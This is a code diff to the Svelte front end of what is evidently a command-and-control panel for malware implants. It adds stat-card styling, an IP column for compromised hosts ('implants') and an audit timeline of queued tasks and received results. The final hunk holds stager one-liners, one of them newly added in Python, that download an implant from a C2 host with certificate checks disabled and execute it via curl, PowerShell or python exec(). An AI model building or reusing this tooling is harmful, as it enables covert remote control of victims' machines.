@@ -58,16 +58,24 @@
   <!-- Stat cards -->
   <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
     {#each [
-      { label: 'Total',   value: implants.length, accent: '#00e5b0', icon: '◈' },
-      { label: 'Online',  value: online,           accent: '#3fb950', icon: '●' },
-      { label: 'Idle',    value: idle,             accent: '#d29922', icon: '◐' },
-      { label: 'Offline', value: offline,          accent: '#f85149', icon: '○' },
+      { label: 'Total',   value: implants.length, accent: '#00e5b0', icon: '◈',  isOnline: false },
+      { label: 'Online',  value: online,           accent: '#3fb950', icon: '●',  isOnline: true  },
+      { label: 'Idle',    value: idle,             accent: '#d29922', icon: '◐',  isOnline: false },
+      { label: 'Offline', value: offline,          accent: '#f85149', icon: '○',  isOnline: false },
     ] as card}
-      <div class="rounded-xl bg-base-200 border border-base-300 px-4 py-3 transition-all duration-200
-                  hover:border-opacity-60"
-           style="border-left: 3px solid {card.accent}">
+      <div class="relative rounded-xl bg-base-200 border border-base-300 px-4 py-3 transition-all duration-200
+                  hover:border-opacity-80 overflow-hidden"
+           style="border-left: 3px solid {card.accent};
+                  {card.isOnline && online > 0
+                    ? `box-shadow: 0 0 18px rgba(63,185,80,0.12), inset 0 0 24px rgba(63,185,80,0.04)`
+                    : ''}">
+        {#if card.isOnline && online > 0}
+          <!-- Pulse ring on Online card -->
+          <span class="absolute inset-0 rounded-xl pointer-events-none animate-pulse"
+                style="box-shadow: inset 0 0 0 1.5px rgba(63,185,80,0.25)"></span>
+        {/if}
         <div class="text-xs text-base-content/40 uppercase tracking-wider mb-1">{card.label}</div>
-        <div class="text-2xl font-mono font-bold" style="color: {card.accent}">{card.value}</div>
+        <div class="text-3xl font-mono font-bold" style="color: {card.accent}">{card.value}</div>
       </div>
     {/each}
   </div>
@@ -92,22 +100,27 @@
                   <th>Status</th>
                   <th>Identity</th>
                   <th>OS</th>
+                  <th>IP</th>
                   <th>Last seen</th>
                 </tr>
               </thead>
               <tbody>
                 {#each implants as i (i.id)}
                   {@const s = i.status ?? 'offline'}
-                  <tr class="hover cursor-pointer" onclick={() => onSelectImplant(i)}>
+                  <tr class="cursor-pointer transition-all duration-100 hover:bg-base-300/40"
+                      style="hover:box-shadow: inset 0 0 0 1px rgba(0,229,176,0.1)"
+                      onclick={() => onSelectImplant(i)}>
                     <td>
-                      <div class="flex items-center gap-1.5">
-                        <span class="inline-block w-2 h-2 rounded-full
-                          {s==='online'?'bg-success animate-pulse':s==='idle'?'bg-warning':'bg-error'}"></span>
-                        <span class="text-base leading-none">{platformIcon(i.os)}</span>
+                      <div class="flex items-center gap-2">
+                        <span class="inline-block w-2.5 h-2.5 rounded-full shrink-0
+                          {s==='online'?'bg-success animate-pulse':s==='idle'?'bg-warning':'bg-error'}"
+                          style="{s==='online'?'box-shadow:0 0 6px #3fb950':''}"></span>
+                        <span class="text-lg leading-none">{platformIcon(i.os)}</span>
                       </div>
                     </td>
-                    <td class="font-mono text-xs">{i.user}@{i.hostname}</td>
+                    <td class="font-mono text-xs font-semibold">{i.user}@{i.hostname}</td>
                     <td class="text-xs text-base-content/50 max-w-[120px] truncate">{i.os}</td>
+                    <td class="text-xs font-mono text-base-content/40">{i.ip ?? '—'}</td>
                     <td class="text-xs text-base-content/40">{timeSince(i.last_seen)}</td>
                   </tr>
                 {/each}
@@ -132,16 +145,27 @@
         {:else if auditEntries.length === 0}
           <p class="text-sm text-base-content/30 py-4 text-center">No activity yet.</p>
         {:else}
-          <div class="space-y-0 text-xs">
+          <!-- Timeline -->
+          <div class="relative pl-5 text-xs space-y-0">
+            <!-- Vertical line -->
+            <div class="absolute left-2 top-0 bottom-0 w-px bg-base-300"></div>
             {#each auditEntries as e (e.timestamp + e.action)}
               {@const aColor = { implant_registered: '#f97316', task_queued: '#00e5b0', result_received: '#3fb950', task_cancelled: '#d29922' }[e.action] ?? '#c9d1d9'}
-              <div class="flex items-center gap-2 py-1.5 border-b border-base-300/40 text-xs"
-                   style="border-left: 2px solid {aColor}; padding-left: 8px; margin-left: -8px">
-                <span class="font-mono text-base-content/40 truncate flex-1">
-                  {e.action.replace(/_/g,' ')}
-                  <span class="text-base-content/25">· {e.implant_id?.slice(0,8)}</span>
-                </span>
-                <span class="text-base-content/25 shrink-0">{timeSince(e.timestamp)}</span>
+              <div class="relative flex items-start gap-2 py-1.5">
+                <!-- Circle dot on the timeline line -->
+                <span class="absolute -left-[13px] top-[9px] w-2 h-2 rounded-full shrink-0 border-2 border-base-200"
+                      style="background:{aColor}; box-shadow: 0 0 6px {aColor}44"></span>
+                <div class="flex-1 min-w-0">
+                  <span class="font-semibold text-base-content/70 capitalize">
+                    {e.action.replace(/_/g,' ')}
+                  </span>
+                  {#if e.implant_id}
+                    <code class="ml-1.5 px-1 py-0.5 rounded text-xs font-mono bg-base-300 text-base-content/45">
+                      {e.implant_id.slice(0,8)}
+                    </code>
+                  {/if}
+                </div>
+                <span class="text-base-content/25 shrink-0 font-mono text-xs">{timeSince(e.timestamp)}</span>
               </div>
             {/each}
           </div>
@@ -174,6 +198,8 @@
               cmd: `curl -sk https://C2_HOST:9444/api/stage/implant | python3` },
             { label: 'PowerShell (Windows)', idx: 2,
               cmd: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadString('https://C2_HOST:9444/api/stage/implant')|python3` },
+            { label: 'Python (Windows)', idx: 3,
+              cmd: `python -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; exec(urllib.request.urlopen('https://C2_HOST:9444/api/stage/implant',context=ctx).read())"` },
           ] as stager}
             <div class="rounded-lg bg-base-300 border border-base-content/10 p-2.5">
               <div class="flex items-center justify-between mb-1.5">
